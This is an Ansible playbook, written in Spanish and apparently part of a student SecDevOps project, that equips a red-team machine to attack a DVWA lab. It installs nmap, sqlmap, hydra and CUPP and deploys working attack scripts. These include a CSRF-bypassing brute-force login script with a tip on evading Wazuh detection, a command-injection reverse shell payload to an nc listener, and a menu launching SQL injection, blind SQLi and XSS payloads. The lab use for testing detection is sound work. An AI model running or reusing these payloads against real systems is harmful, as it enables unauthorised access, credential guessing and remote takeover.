---
- name: Preparar entorno de ataque Red Team
  hosts: redteam
  become: yes

  tasks:
    - name: Actualizar repositorios base
      ansible.builtin.apt:
        update_cache: yes
        upgrade: dist
        cache_valid_time: 3600

    - name: Instalar arsenal de Pentesting y utilidades de rendimiento
      ansible.builtin.apt:
        name:
          - nmap       # Escaneo de puertos y evasión de firewalls
          - sqlmap     # Inyecciones SQL automatizadas
          - hydra      # Fuerza bruta paralela
          - tmux       # Multiplexor de terminal
          - htop       # Monitorización de recursos
          - curl
          - wget
          - python3
          - python3-pip
          - python3-bs4
          - python3-requests
          - git
        state: present

    - name: Crear directorio para scripts del RedTeam
      ansible.builtin.file:
        path: /home/walter/scripts
        state: directory
        owner: walter
        group: walter
        mode: '0755'

    - name: Optimizar OS para ataques de alta concurrencia (File Descriptors)
      ansible.builtin.blockinfile:
        path: /etc/security/limits.conf
        block: |
          * soft nofile 65535
          * hard nofile 65535
          root soft nofile 65535
          root hard nofile 65535
      notify: Aplicar sysctl


# ===========================================================================
#  INTEGRACIÓN DE CUPP (Generador de Diccionarios personalizados)
# ===========================================================================

    - name: Clonar repositorio oficial de CUPP
      ansible.builtin.git:
        repo: 'https://github.com/Mebus/cupp.git'
        dest: /opt/cupp
        depth: 1

    - name: Configurar permisos de ejecución para el script de Python
      ansible.builtin.file:
        path: /opt/cupp/cupp.py
        mode: '0755'

    - name: Crear enlace simbólico para acceso global a CUPP
      ansible.builtin.file:
        src: /opt/cupp/cupp.py
        dest: /usr/local/bin/cupp
        state: link


# ===========================================================================
#  SCRIPTS PERSONALIZADOS
# ===========================================================================


    - name: Script recolector de cookies (Python)
      ansible.builtin.copy:
        dest: /home/walter/scripts/get_cookie.py
        owner: walter
        mode: '0755'
        content: |
          import requests
          from bs4 import BeautifulSoup

          # Configuración de URLs (IP de la WAN de OPNsense)
          url_base = "http://192.168.122.144"
          url_login = f"{url_base}/login.php"

          def obtener_cookie():
              s = requests.Session()
              
              # 1. Obtener el Token CSRF inicial
              r_get = s.get(url_login)
              soup = BeautifulSoup(r_get.text, 'html.parser')
              try:
                  token = soup.find('input', {'name': 'user_token'})['value']
              except TypeError:
                  return "ERROR: No se pudo encontrar el token CSRF"

              # 2. Realizar el Login
              datos_login = {
                  'username': 'admin',
                  'password': 'password',
                  'Login': 'Login',
                  'user_token': token
              }
              r_post = s.post(url_login, data=datos_login)

              # Verificación de éxito 
              if "login.php" in r_post.url:
                  return "ERROR: Login fallido (revisa credenciales)"

              # 3. Extraer y devolver la cookie formateada
              cookie_dict = s.cookies.get_dict()
              if 'PHPSESSID' in cookie_dict:
                  # Devolvemos la cadena exacta
                  return f"PHPSESSID={cookie_dict['PHPSESSID']}; security=low"
              
              return "ERROR: No se encontró la cookie PHPSESSID"

          if __name__ == "__main__":
              # Imprimimos el resultado de la función "obtener_cookies()"
              resultado = obtener_cookie()
              print(resultado)

    - name: Script Fuerza bruta anti-csrf
      ansible.builtin.copy:
        dest: /home/walter/scripts/anti-csrf.py
        owner: walter
        mode: '0755'
        content: |
          #!/usr/bin/env python3

          import requests
          from bs4 import BeautifulSoup
          import time

          url = "http://192.168.122.144/login.php"
          diccionario = "/home/walter/scripts/diccionario.txt"

          # Creamos una "Sesión" para que el servidor nos recuerde (cookies)
          s = requests.Session()

          print("[*] Iniciando ataque de fuerza bruta con evasión de CSRF...")

          with open(diccionario, "r") as file:
              for password in file.read().splitlines():
                  
                  # 1. Entramos a la web para robar el token fresco
                  respuesta_get = s.get(url)
                  soup = BeautifulSoup(respuesta_get.text, 'html.parser')
                  
                  # Buscamos el campo oculto 'user_token' en el código HTML
                  token_fresco = soup.find('input', {'name': 'user_token'})['value']
                  
                  # 2. Preparamos nuestro ataque mezclando la contraseña y el token robado
                  datos_post = {
                      'username': 'admin',
                      'password': password,
                      'Login': 'Login',
                      'user_token': token_fresco
                  }
                  
                  # 3. Disparamos el ataque
                  respuesta_post = s.post(url, data=datos_post)
                  
                  # 4. Comprobamos si hemos pasado
                  if "Login failed" not in respuesta_post.text:
                      print(f"[+] ¡BINGO! Contraseña encontrada: {password}")
                      break
                  else:
                      print(f"[-] Fallo: {password} (Token usado: {token_fresco[:5]}...)")
                  
                  # Podemos ponerle un sleep de X segundos para que la regla de Wazuh no nos detecte
                  # time.sleep(7)

    - name: Script ataque Reverse-Shell
      ansible.builtin.copy:
        dest: /home/walter/scripts/ataque_reverse_shell.sh
        owner: walter
        mode: '0755'
        content: |
          #!/bin/bash

          if [ "$1" == "escucha" ]; then
              echo "[+] Iniciando listener en el puerto 4444..."
              nc -lvnp 4444

          elif [ "$1" == "ataque" ]; then
              echo "[+] Lanzando payload contra DVWA a traves del firewall..."
              curl -s -X POST "http://192.168.122.144/vulnerabilities/exec/" \
                -H "Cookie: $(python3 /home/walter/scripts/get_cookie.py)" \
                --data-urlencode "ip=127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.168.122.84/4444 0>&1'" \
                --data-urlencode "Submit=Submit"

          else
              echo "Uso incorrecto."
              echo "Para escuchar: ./ataque_reverse_shell.sh escucha"
              echo "Para atacar:   ./ataque_reverse_shell.sh ataque"
          fi

    - name: Script menu_ataques.sh
      ansible.builtin.copy:
        dest: /home/walter/scripts/menu_ataques.sh
        owner: walter
        mode: '0755'
        content: |
          #!/bin/bash

          VERDE='\033[0;32m'
          AZUL='\033[1;34m'
          ROJO='\033[0;31m'
          NC='\033[0m'

          IP_OBJETIVO="192.168.122.144"

          mostrar_menu() {
              clear
              echo -e "${AZUL}====================================================${NC}"
              echo -e "${AZUL}    ARSENAL DE PRUEBAS - DEMOSTRACIÓN TFC SECDEVOPS  ${NC}"
              echo -e "${AZUL}====================================================${NC}"
              echo "1) SQLi - Ataque Simple (Tautología)"
              echo "2) SQLi - Ataque Avanzado (Blind SQLi con Sleep)"
              echo "3) SQLi - Herramienta Automatizada (Sqlmap)"
              echo "4) XSS  - Inyección de Etiqueta Script"
              echo "5) XSS  - Evasión con Atributo onerror"
              echo "6) Escáner - User-Agent de Nikto"
              echo "7) Reconocimiento - Escaneo de Puertos (Nmap)"
              echo "8) Fuerza Bruta - Hydra contra Login"
              echo "9) Fuerza Bruta - Script Personal (Anti-CSRF Bypass)"
              echo "0) Salir"
              echo -e "${AZUL}====================================================${NC}"
              echo -n "Selecciona un ataque para ejecutar: "
          }

          ejecutar_ataque() {
              echo -e "\n${VERDE}[+] Preparando:${NC} $1"
              echo -e "${VERDE}[+] Comando que se va a lanzar:${NC}\n    $2\n"
              
              read -p "Presiona [ENTER] para disparar el ataque..."
              
              echo -e "\n${ROJO}[!] Lanzando ataque...${NC}"
              eval $2

              echo -e "\n${VERDE}[✓] Ataque enviado.${NC}"
              echo -e "${AZUL}[i] Revisa ahora el Dashboard de Wazuh y los logs del WAF.${NC}"
              echo "----------------------------------------------------"
              read -p "Presiona [ENTER] para regresar al menú principal..."
          }

          while true; do
              mostrar_menu
              read opcion
              case $opcion in
                  1)
                      CMD="curl -i -s -X GET \"http://$IP_OBJETIVO/vulnerabilities/sqli/?id=1'%20OR%20'1'='1&Submit=Submit\" | head -n 15"
                      ejecutar_ataque "Inyección SQL básica mediante parámetro GET" "$CMD"
                      ;;
                  2)
                      CMD="curl -i -s -X GET \"http://$IP_OBJETIVO/vulnerabilities/sqli/?id=1'%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))A)/*&Submit=Submit\" | head -n 15"
                      ejecutar_ataque "Blind SQLi intentando pausar la BD 5 segundos" "$CMD"
                      ;;
                  3)
                      CMD="sqlmap -u \"http://$IP_OBJETIVO/index.php?id=1\" --batch --flush-session"
                      ejecutar_ataque "Auditoría automatizada de inyección SQL con Sqlmap" "$CMD"
                      ;;
                  4)
                      CMD="curl -i -s -X GET \"http://$IP_OBJETIVO/vulnerabilities/xss_r/?name=<script>alert(1)</script>\" | head -n 15"
                      ejecutar_ataque "Cross-Site Scripting reflejado con etiqueta clásica" "$CMD"
                      ;;
                  5)
                      CMD="curl -i -s -X GET \"http://$IP_OBJETIVO/vulnerabilities/xss_r/?name=<img%20src=x%20onerror=alert(String.fromCharCode(88,83,83))>\" | head -n 15"
                      ejecutar_ataque "XSS avanzado evadiendo firmas con manejador de eventos" "$CMD"
                      ;;
                  6)
                      CMD="curl -i -s -H \"User-Agent: Nikto\" \"http://$IP_OBJETIVO/index.php\" | head -n 15"
                      ejecutar_ataque "Petición legítima modificando User-Agent (Simulación Nikto)" "$CMD"
                      ;;
                  7)  
                      CMD="nmap $IP_OBJETIVO"
                      ejecutar_ataque "Escáner de puertos y reconocimiento con Nmap" "$CMD"
                      ;;
                  8)  
                      CMD="hydra -l admin -P diccionario.txt $IP_OBJETIVO http-post-form \"/login.php:user=^USER^&password=^PASS^&Login=Login:F=Login failed\""
                      ejecutar_ataque "Fuerza bruta contra formulario web con Hydra" "$CMD"
                      ;;
                  9)
                      CMD="./anti-csrf.py"
                      ejecutar_ataque "Fuerza bruta contra formulario web con script personal" "$CMD"
                      ;;
                  0)
                      echo "Saliendo del arsenal..."
                      exit 0
                      ;;
                  *)
                      echo "Opción no válida."
                      sleep 1
                      ;;
              esac
          done

